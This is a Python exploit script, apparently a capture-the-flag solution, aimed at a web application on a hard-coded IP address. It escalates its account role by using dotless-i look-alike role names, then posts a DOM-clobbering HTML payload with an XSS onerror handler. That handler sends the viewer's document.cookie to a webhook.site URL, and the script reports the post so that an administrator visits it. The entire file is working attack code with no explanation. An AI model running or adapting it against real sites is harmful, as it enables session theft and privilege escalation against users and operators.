import requests
import json

url = "http://3.35.104.112:3000"
webhook = "https://webhook.site/aa19d88a-c693-4d1c-bd42-7cecf9722d56"

def register(password):
    res = requests.post(f"{url}/auth/register", json={"password": password})
    data = json.loads(res.text)

    return data["uuid"]

def login(uuid, password):
    res = requests.post(f"{url}/auth/login", json={"uuid": uuid, "password": password})
    data = json.loads(res.text)

    return data["token"]

def setRole(role, token):
    res = requests.post(f"{url}/user/role", json={"role": role}, cookies={"jwt": token})
    data = json.loads(res.text)

    return data["token"]

def setPerm(uuid, token):
    requests.post(f"{url}/admin/user/perm", json={"uuid": uuid, "value":True}, cookies={"jwt": token})

def writePost(token):
    res = requests.post(f"{url}/post/write", json={"title": "test", "content": '''
                                                <area id="conf">
                                                <area id="conf" name="deleteUrl" href="/admin/test/?title=dummy&content=<img src=x onerror='location.href=`''' + webhook + '''/${document.cookie}`'>">'''
                                                }, cookies={"jwt": token})
    data = json.loads(res.text)
    return data["post"]["post_id"]

def reportPost(post_id, token):
    res = requests.get(f"{url}/report/{post_id}", cookies={"jwt": token})

    return res.text

password="test"

uuid = register(password)
token = login(uuid, password)
token = setRole("admın", token)
setPerm(uuid, token)
token = setRole("ınspector", token)
token = login(uuid, password)
post_id = writePost(token)
reportPost(post_id + "/", token)